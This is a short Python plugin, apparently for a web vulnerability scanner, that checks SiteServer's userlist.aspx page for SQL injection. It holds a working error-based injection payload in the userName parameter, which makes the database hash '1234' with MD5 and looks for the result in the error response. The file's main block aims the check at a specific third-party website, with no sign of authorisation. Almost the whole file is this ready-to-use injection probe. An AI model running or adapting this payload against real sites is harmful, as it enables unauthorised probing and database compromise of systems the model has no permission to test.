#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
title  :  Siteserver userlist.aspx SQL Injection
author : a@lcx.cc
"""

import  re

def assign(service, arg):
    if service == "siteserver":
        return True, arg
        
def audit(arg):
    payload = "livefiles/pages/inner/userlist.aspx?ModuleType=Friends&RelatedUserType=Friends&UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&userName=1%27and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
    code, head, res, errcode, _ = curl.curl(arg + payload)
    if code==500 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole('Siteserver userlist.aspx SQL Injection ')

if __name__ == '__main__':
    from dummy import *
    audit(assign('siteserver','http://www.globechildren.com/')[1])